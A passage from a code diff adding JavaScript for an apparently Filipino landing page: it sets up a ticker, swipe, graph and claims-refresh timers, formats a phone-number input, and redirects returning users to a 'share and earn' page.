+        startTicker();
+
+        // ✅ Delay initSwipe para siguradong naka-render ang track
+        setTimeout(function() {
+            initSwipe();
+        }, 100);
+
+        drawLineGraph();
+        loadTotalClaims();
+
+        graphUpdateInterval = setInterval(drawLineGraph, 15000);
+        claimsRefreshInterval = setInterval(loadTotalClaims, 30000);
+
+        if (modalOverlay) {
+            modalOverlay.addEventListener('click', function(e) {
+                if (e.target === modalOverlay) closeModal();
+            });
+        }
+
+        if (userPhoneInput) {
+            userPhoneInput.addEventListener('input', function() {
+                var value = this.value.replace(/\D/g, '');
+                if (value.length > 10) value = value.substring(0, 10);
+
+                var formatted = value;
+                if (value.length > 6) {
+                    formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
+                } else if (value.length > 3) {
+                    formatted = value.substring(0, 3) + ' ' + value.substring(3);
+                }
+                this.value = formatted;
+            });
+
+            userPhoneInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') processStep1();
+            });
+        }
+
+        console.log('✅ Index page initialized');
+    }
+
+    // ========== EXPORT ==========
+    window.processStep1 = processStep1;
+    window.closeModal = closeModal;
+
+    // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
+    (function() {
+        var existingUserPhone = localStorage.getItem("userPhone");
+        if (existingUserPhone && existingUserPhone !== 'null' && existingUserPhone !== 'undefined' && existingUserPhone.length > 5) {
+            console.log('Existing user detected. Redirecting...');
+            window.location.href = "share_and_earn.html";
+        }
+    })();
+
+    // ========== START ==========
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+
+})();
